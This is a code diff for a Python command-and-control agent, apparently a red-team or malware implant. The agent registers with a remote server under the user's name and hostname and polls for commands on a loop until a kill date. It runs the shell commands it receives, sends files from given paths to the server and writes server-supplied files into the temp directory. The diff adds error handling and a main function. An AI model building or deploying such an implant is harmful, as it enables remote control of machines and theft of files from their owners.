@@ -6,8 +6,7 @@ import base64
 import datetime
 import subprocess
 import time
-# TODO basic error checking
-
+import os, tempfile
 # variables that should be changed
 # date in yyyy/mm/dd format
 killdate= datetime.datetime(2021,12,14)
@@ -36,19 +35,27 @@ def get_command(aId):
         return response.json()
     else:
         return '{}'
-
     #print(response.content)
-    return response.json()
+   # return response.json()
 def execute_command(data):
     if data['CommandType']=='FileTransfer':
         if data['TransferLog']['direction']=='Download':
             path=data['TransferLog']['Path']
             log_id = data['id']
             filename = data['TransferLog']['FileName']
-            Upload_file(log_id,filename,path)
-            return "Sucess"
+            try:
+                Upload_file(log_id,filename,path)
+                return "Success"
+            except:
+                return "Failed"
         if data['TransferLog']['direction']=='Upload':
-            print("upload")
+            filename= data['TransferLog']['FileName']
+            an_id =data['id']
+            try:
+                download_file(an_id,filename)
+                return "Success" 
+            except:
+                return "Failed"
         #print("file transfer")
     if data['CommandType']=='ShellCommand':
         return subprocess.check_output(data['Command'].split(' '))
@@ -56,7 +63,9 @@ def execute_command(data):
 def download_file(command_id,filename):
     response= requests.get(ServerUrl+"api/AgentDownload/"+str(command_id)+"/")
     #filename=data['TransferLog']['FileName']
-    with open(str(filename),"wb") as file:
+
+    path = os.path.join(tempfile.gettempdir(), filename)
+    with open(path,"wb") as file:
         for chunk in response.iter_content(chunk_size=1024):
             if chunk:
                 file.write(chunk)
@@ -68,25 +77,27 @@ def report_output(output,command_id):
     requests.post(ServerUrl+"api/agentreportoutput/",data=data)
 # main method
 #has_registered=False
-
-agent_id = -1
-#derive agent name
-AgentName= getpass.getuser()+"@" + socket.gethostname()
-# getting registered 
-while(agent_id<0):
-    checkDate(killdate)
-    agent_id= register(AgentName)
-    print(agent_id)
-    time.sleep(sleep_interval)
-# query for commands
-while(True):
-    checkDate(killdate)
-    data=get_command(agent_id)
-    if data !='{}':
-        output=execute_command(data)
-        print(output)
-        report_output(output,data['id'])
-    time.sleep(sleep_interval)
+def main():
+    agent_id = -1
+    #derive agent name
+    AgentName= getpass.getuser()+"@" + socket.gethostname()
+    # getting registered 
+    while(agent_id<0):
+        checkDate(killdate)
+        agent_id= register(AgentName)
+        print(agent_id)
+        time.sleep(sleep_interval)
+    # query for commands
+    while(True):
+        checkDate(killdate)
+        data=get_command(agent_id)
+        if data !='{}':
+            output=execute_command(data)
+            print(output)
+            report_output(output,data['id'])
+        time.sleep(sleep_interval)
+if __name__ == "__main__":
+    main()
 
 
 
